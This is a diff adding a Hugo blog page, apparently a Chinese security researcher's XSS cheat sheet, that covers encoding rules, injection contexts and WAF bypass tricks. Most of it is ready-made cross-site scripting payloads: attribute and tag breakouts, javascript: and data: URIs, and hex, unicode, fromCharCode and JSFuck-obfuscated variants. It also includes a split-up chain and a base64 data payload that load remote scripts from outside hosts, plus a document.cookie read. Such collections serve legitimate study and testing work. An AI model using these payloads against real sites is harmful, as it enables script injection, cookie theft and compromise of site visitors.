@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		
+		<meta name="author" content="ifish">
+		
+		<meta name="generator" content="Hugo 0.45.1" />
+		<title>xss &middot; if1sh</title>
+		<link rel="shortcut icon" href="https://ifishzz.github.io//images/favicon.ico">
+		<link rel="stylesheet" href="https://ifishzz.github.io//css/style.css">
+		<link rel="stylesheet" href="https://ifishzz.github.io//css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://ifishzz.github.io//css/font-awesome.min.css">
+		
+
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://ifishzz.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://ifishzz.github.io//posts'>Archive</a>
+	<a href='https://ifishzz.github.io//tags'>Tags</a>
+	<a href='https://ifishzz.github.io//categories'>Cate</a>
+
+	<a href='https://ifishzz.github.io//about'>About</a>
+
+	
+
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        xss
+                    </h1>
+                    <h2 class="headline">
+                    Dec 30, 2018 00:00
+                    · 3163 words
+                    · 7 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://ifishzz.github.io//tags/xss">xss</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#0x01-编码知识">0x01 编码知识</a>
+<ul>
+<li><a href="#html编码">HTML编码</a></li>
+<li><a href="#javascript编码">javascript编码</a></li>
+<li><a href="#css编码">css编码</a></li>
+<li><a href="#编码与解码顺序">编码与解码顺序</a></li>
+<li><a href="#参考资料">参考资料</a></li>
+</ul></li>
+<li><a href="#0x02-xss输出位置">0x02 xss输出位置</a>
+<ul>
+<li><a href="#html标签之间">html标签之间</a></li>
+<li><a href="#html标签之内">html标签之内</a></li>
+<li><a href="#成为javascript的值">成为javascript的值</a></li>
+</ul></li>
+<li><a href="#0x03-一些过waf技巧">0x03 一些过waf技巧</a></li>
+<li><a href="#0x04-xss备忘录">0x04 xss备忘录</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    
+
+<h2 id="0x01-编码知识">0x01 编码知识</h2>
+
+<h3 id="html编码">HTML编码</h3>
+
+<p>实体编码</p>
+
+<pre><code>&lt; : &amp;lt;或者&amp;#60;
+&gt; : &amp;gt; 或者 &amp;#62;
+</code></pre>
+
+<p>进制编码</p>
+
+<pre><code>&amp;#xH;(十六进制格式)、&amp;#D;(十进制格式),最后的分号可以省略
+</code></pre>
+
+<h3 id="javascript编码">javascript编码</h3>
+
+<pre><code>unicode编码: \u006c(\u+四位十六进制数字)
+十六进制: \x6c
+八进制: \154
+</code></pre>
+
+<h3 id="css编码">css编码</h3>
+
+<pre><code>用一个反斜线(\)后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”
+css的属性名和属性值之间的冒号把编码包住，否则不解析
+</code></pre>
+
+<h3 id="编码与解码顺序">编码与解码顺序</h3>
+
+<p>解码时先解码最外层，编码时先编码最内层</p>
+
+<pre><code>如&lt;td onclick=&quot;openUrl(add.do?userName='{$value}');&quot;&gt;11&lt;/tdjiaob&gt;，
+首先value出现在url中，而url在js中，而js又是html一部分，所以
+解码顺序为：html解码-&gt;js解码-&gt;url解码
+编码顺序为：url编码-&gt;js编码-&gt;html编码
+</code></pre>
+
+<h3 id="参考资料">参考资料</h3>
+
+<ul>
+<li><a href="https://drops.xxe.im/#!/drops/103.XSS%E4%B8%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%20---%E7%A7%91%E6%99%AE%E6%96%87">https://drops.xxe.im/#!/drops/103.XSS%E4%B8%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%20---%E7%A7%91%E6%99%AE%E6%96%87</a></li>
+<li><a href="http://wyb0.com/posts/xss-encode/">http://wyb0.com/posts/xss-encode/</a></li>
+<li><a href="https://shinpachi8.github.io/2017/07/28/xss%E7%BC%96%E7%A0%81/">https://shinpachi8.github.io/2017/07/28/xss%E7%BC%96%E7%A0%81/</a></li>
+<li><a href="https://or7.me/2017/09/08/xss_charset/">https://or7.me/2017/09/08/xss_charset/</a></li>
+<li><a href="https://segmentfault.com/a/1190000000497596">https://segmentfault.com/a/1190000000497596</a></li>
+<li><a href="https://www.freebuf.com/articles/web/43285.html">https://www.freebuf.com/articles/web/43285.html</a></li>
+</ul>
+
+<h2 id="0x02-xss输出位置">0x02 xss输出位置</h2>
+
+<p>example url:<a href="http://www.foo.com/xss.php?id=1">http://www.foo.com/xss.php?id=1</a></p>
+
+<h3 id="html标签之间">html标签之间</h3>
+
+<p>普通场景</p>
+
+<pre><code>&lt;div id=&quot;body&quot;&gt;[输出]&lt;/div&gt;
+payload:&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<p>特殊场景</p>
+
+<pre><code>&lt;tietle&gt;&lt;/tietle&gt;
+&lt;textarea&gt;&lt;/textarea&gt;
+&lt;xmp&gt;&lt;/xmp&gt;
+&lt;iframe&gt;&lt;/iframe&gt;
+&lt;noscript&gt;&lt;/noscript&gt;
+&lt;noframes&gt;&lt;/noframes&gt;
+&lt;plaintext&gt;&lt;/plaintext&gt;
+直接将payload插入是不会解析,&lt;title&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/title&gt;
+需要更改payload&lt;/title&gt;&lt;script&gt;alert(1)&lt;/sscript&gt;
+</code></pre>
+
+<h3 id="html标签之内">html标签之内</h3>
+
+<p>普通场景</p>
+
+<pre><code>&lt;input type=&quot;text&quot; value=&quot;[输出]&quot;/&gt;
+payload1:&quot;onmouseover=alert(1) x=&quot;,通过闭合属性,使用on事件触发脚本
+payload2:&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;,闭合标签又闭合属性,直接执行脚本
+</code></pre>
+
+<p>其他输出场景</p>
+
+<pre><code>- 输出在src/href/action等属性内,如&lt;a href=&quot;[输出]&quot;&gt;click me&lt;/a&gt;
+- 输出在on*事件内,如&lt;a href=&quot;#&quot; onclick=&quot;[输出]&quot;&gt;click me&lt;/a&gt;
+- 输出在style属性内,如&lt;a href=&quot;#&quot; style=&quot;[输出]&quot;&gt;click me&lt;/a&gt;
+</code></pre>
+
+<p>1.输出在src/href/action/xlink:href/autofocus/content/data 等属性,使用伪协议绕过</p>
+
+<pre><code>javascript:&lt;a href=&quot;javascript:alert(2)//&quot;&gt;test&lt;/a&gt;
+data:&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;test&lt;/a&gt;(Chrome被拦截，Firefox可以)
+urlencode 版本： &lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;(测试未通过)
+
+不使用 href 的另外一种组合来执行 js： &lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt;（均可） 或者：
+  &lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;1&lt;/a&gt;&lt;/math&gt;(Chrome不可，Firefox可以)
+</code></pre>
+
+<h3 id="成为javascript的值">成为javascript的值</h3>
+
+<p>场景</p>
+
+<pre><code>&lt;script&gt;a=&quot;[输出]&quot;;&lt;/script&gt;
+payload1:&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+payload2:&quot;;alert(1)//
+如果//(javascript注释符)被过滤,可以用逻辑与算术运算符来代替
+payload3:&quot;;alert(1)-
+</code></pre>
+
+<h2 id="0x03-一些过waf技巧">0x03 一些过waf技巧</h2>
+
+<ul>
+<li><p>单次过滤规则绕过：有些规则仅进行一次过滤替换，可以通过双重复写绕过<code>&lt;scr&lt;script&gt;ipt&gt;</code></p></li>
+
+<li><p>大小写绕过：<code>&lt;sCript&gt;</code></p></li>
+
+<li><p>alert被过滤，可以尝试prompt和confirm</p></li>
+
+<li><p>没有引号和分号：<code>&lt;IMG SRC=javascript:alert('XSS')&gt;</code></p></li>
+
+<li><p>空格被过滤：<code>&lt;img/src=&quot;&quot;onerror=alert(2)&gt; &lt;svg/onload=alert(2)&gt;&lt;/svg&gt;</code></p></li>
+
+<li><p>反引号妙用：在ie下使用</p></li>
+
+<li><p>长度限制时： <q/oncut=alert(1)>//在限制长度的地方很有效</p></li>
+
+<li><p>单引号及双引号被过滤情况: <code>&lt;script&gt;alert(/jdq/)&lt;/script&gt;</code> //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显</p></li>
+
+<li><p>javascript伪协议</p></li>
+</ul>
+
+<pre><code>&lt;a href=&quot;javascript:alert(/test/)&quot;&gt;xss&lt;/a&gt;
+&lt;iframe src=javascript:alert('xss');height=0 width=0 /&gt;&lt;iframe&gt;利用iframe框架标签
+</code></pre>
+
+<ul>
+<li><p>畸形payload：<code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code></p></li>
+
+<li><p>/的妙用：<code>&lt;script&gt;alert(/3/)&lt;/script&gt;</code></p></li>
+
+<li><p>括号被过滤,可以使用throw来抛出数据</p></li>
+</ul>
+
+<pre><code>&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;2&lt;/a&gt;
+
+&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;
+
+以上两个测试向量在 Chrome 和 IE 上会出现一个 “uncaught” 错误，可以用下面的向量代替（下面向量在FireFox上测试失败）
+
+&lt;body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';&gt;
+</code></pre>
+
+<ul>
+<li><p>当=();:被过滤时:<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</code>opera 中可以不闭合
+<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41</code> // Opera可查</p></li>
+
+<li><p>过滤某些关键字（如：javascript） 可以在属性中的引号内容中使用空字符、空格、TAB换行、注释、特殊的函数，将代码行隔开。比如在使用<code>&lt;iframe src=&quot;javascript:alert(1253)&quot; height=0 width=0 /&gt;&lt;iframe&gt;</code>时，可以用回车、Tab键将src中的内容隔开，回车的url编码为%0a,%0b; 拼凑法：① 双写绕过；② 使用js定义变量z=scri, z+pt=script; ③ 两处输出点<code>&lt;scri&lt;!-- 第二处--&gt;pt&gt;;</code></p></li>
+
+<li><p>无法使用href:</p></li>
+</ul>
+
+<pre><code class="language-&lt;a">在chrome下，其回补全缺失的引号。因此，也可以这样写：
+&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
+</code></pre>
+
+<p>解决限制字符(要求同页面)</p>
+
+<pre><code>&lt;script&gt;z=’document.’&lt;/script&gt; &lt;script&gt;z=z+’write(“‘&lt;/script&gt; &lt;script&gt;z=z+’&lt;script’&lt;/script&gt; &lt;script&gt;z=z+’ src=ht’&lt;/script&gt; &lt;script&gt;z=z+’tp://ww’&lt;/script&gt;
+&lt;script&gt;z=z+’w.shell’&lt;/script&gt; &lt;script&gt;z=z+’.net/1.’&lt;/script&gt; &lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;
+&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt; &lt;script&gt;eval_r(z)&lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>编码：</li>
+</ul>
+
+<p>JS函数（如eval，settimeout）还有就是href= action= formaction= location= on*= name= background= poster= src= code=这些地方，可以配合编码。此外，data属性可以base64编码。</p>
+
+<ol>
+<li>js16进制
+<code>
+&lt;script&gt;eval(“js+16进制加密”)&lt;/script&gt; &lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29&quot;)&lt;/script&gt; 编码要执行的语句↓
+Alert(“xss”)
+</code></li>
+<li>js unicode</li>
+</ol>
+
+<pre><code>&lt;script&gt;eval(&quot;unicode加密&quot;)&lt;/script&gt; //js unicode加密 解决alert()被过滤
+&lt;script&gt;eval(&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029&quot;)&lt;/script&gt;
+String.fromCharCode函数（不需要任何引号，必须函数内）
+
+&lt;script&gt;eval(String.fromCharCode编码内容))&lt;/script&gt; &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))&lt;/script&gt;
+</code></pre>
+
+<ol>
+<li>jsfuck版本
+<code>
+&lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;/script&gt;
+</code></li>
+
+<li><p>HTML编码：</p>
+
+<p><code>&lt;img src='1' onerror='aler&amp;#x0074;(1)'&gt;</code>
+base64编码（仅data支持）</p>
+
+<pre><code> &lt;object data=&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUnE5bjZ6dT48L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;
+ 格式：
+ Data:&lt;mime type&gt;,&lt;encoded data&gt;
+ Data //协议
+ &lt;mime type&gt; //数据类型
+ charset=&lt;charset&gt;  //指定编码
+ [;base64] //被指定的编码
+ &lt;encoded data&gt; //定义data协议的编码
+ 特点：不支持IE
+</code></pre>
+
+<h2 id="0x04-xss备忘录">0x04 xss备忘录</h2>
+
+<p><a href="http://momomoxiaoxi.com/2017/10/10/XSS/">http://momomoxiaoxi.com/2017/10/10/XSS/</a></p></li>
+</ol>
+
+                </section>
+            </article>
+
+            
+                
+
+            
+
+            
+
+            
+
+            <footer id="footer">
+    
+    
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/ifishzz">ifish</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://ifishzz.github.io//js/jquery-3.3.1.min.js"></script>
+<script src="https://ifishzz.github.io//js/main.js"></script>
+<script src="https://ifishzz.github.io//js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+
+
+
+<script>
+var baiduAnalytics = '';
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?" + baiduAnalytics;
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+    </body>
+</html>
